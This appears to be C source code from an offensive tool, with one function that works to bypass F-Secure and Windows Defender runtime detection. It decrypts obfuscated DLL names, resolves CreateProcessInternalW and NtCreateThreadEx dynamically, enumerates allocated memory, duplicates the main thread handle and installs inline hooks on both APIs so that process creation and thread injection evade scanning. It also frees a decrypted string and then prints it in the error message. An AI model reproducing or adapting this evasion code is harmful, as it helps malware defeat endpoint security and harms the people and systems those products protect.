#include "anti_av_fsecure_definitions.h"
#include "anti_av_fsecure_customhooks.h"
#include "anti_av_fsecure_memory.h"

#include "windows.h"

#include <stdio.h>
#include "global_config.h"

#include "functions_table_utils.h"
#include "functions_table_constants.h"
#include "functions_table.h"
#include "crypto.h"

#include "debug.h"

#include "function_table_core.h"

extern PCreateProcessInternalW CreateProcessInternalW;
extern PNtCreateThreadEx NtCreateThreadEx;

extern LPHOOK_RESULT createProcessHookResult;
extern LPHOOK_RESULT createRemoteThreadHookResult;

extern HANDLE to_be_scanned_Thread;

extern ALLOCATED_ADDRESSES_RESULT allocatedAddresses;

void fsecure_windows_defender_runtime_suspect_apis_call_bypass(HANDLE * main_thread_handle, PVOID memory_start_address, DWORD memory_size) {
	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - Started.\n");

	
	/// <summary>
	/// for: CreateProcessInternalW()
	/// </summary>
	/// <param name="main_thread_handle"></param>

	//
	char* decrypted_kernel32_dll_string = NULL;

	decrypt_to_string(&decrypted_kernel32_dll_string, KERNEL32_DLL_STRING, KERNEL32_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_kernel32_dll() - for decrypted_kernel32_dll_string: %s\n", decrypted_kernel32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_kernel32_dll_string);

	//
	free(decrypted_kernel32_dll_string);

	if (handle == NULL) {
		DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - GetModuleHandle() for: %s failed, error code: %d\n", decrypted_kernel32_dll_string, l_GetLastError());
		return;
	}


	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;

	get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateProcessInternalW_STRING, CreateProcessInternalW_STRING_LEN);

	//

	CreateProcessInternalW = (PCreateProcessInternalW)function_pointer;

	if (CreateProcessInternalW == NULL) {
		DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - CreateProcessInternalW == NULL, exit now.\n");
		l_ExitProcess(-1);
	}


	/// <summary>
	/// for: CreateProcessInternalW()
	/// </summary>
	/// <param name="main_thread_handle"></param>

	//
	char* decrypted_ntdll_dll_string = NULL;

	decrypt_to_string(&decrypted_ntdll_dll_string, NTDLL_DLL_STRING, NTDLL_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_ntdll_dll() - decrypted_ntdll_dll_string: %s\n", decrypted_ntdll_dll_string);

	//
	handle = l_GetModuleHandleA(decrypted_ntdll_dll_string);

	//
	free(decrypted_ntdll_dll_string);

	if (handle == NULL) {
		DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - GetModuleHandle() for: %s failed, error code: %d\n", decrypted_ntdll_dll_string, l_GetLastError());
		return;
	}


	//
	function_pointer = NULL;
	decrypted_function_name = NULL;

	get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtCreateThreadEx_STRING, NtCreateThreadEx_STRING_LEN);

	//

	NtCreateThreadEx = (PNtCreateThreadEx)function_pointer;

	if (NtCreateThreadEx == NULL) {
		DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - NtCreateThreadEx == NULL, exit now.\n");
		l_ExitProcess(-1);
	}

	/// <summary>
	/// 
	/// </summary>
	/// <param name="main_thread_handle"></param>
	
	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - getAllocatedAddresses()\n");


	//allocatedAddresses = getAllocatedAddresses(PAGE_EXECUTE_READWRITE, memory_start_address, memory_size);
	allocatedAddresses = getAllocatedAddresses(memory_start_address, memory_size);

	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - getAllocatedAddresses() - done.\n");

	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - DuplicateHandle()\n");
	
	bool res = l_DuplicateHandle(l_GetCurrentProcess(), *main_thread_handle, l_GetCurrentProcess(), &to_be_scanned_Thread, NULL, FALSE, DUPLICATE_SAME_ACCESS);

	if (!res) {
		DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - DuplicateHandle() failed, code: %d.\n", l_GetLastError());
		return;
	}

	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - DuplicateHandle() - done.\n");

	// install hooks
	///

	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - installHook() for CreateProcessInternalW() .\n");

	createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 10);

	DBG_MSG("anti_av_fsecure_windows_defender_runtime_suspect_apis_call_bypass() - installHook() for NtCreateThreadEx() .\n");
	createRemoteThreadHookResult = installHook(NtCreateThreadEx, hookCreateRemoteThreadEx, 10);

}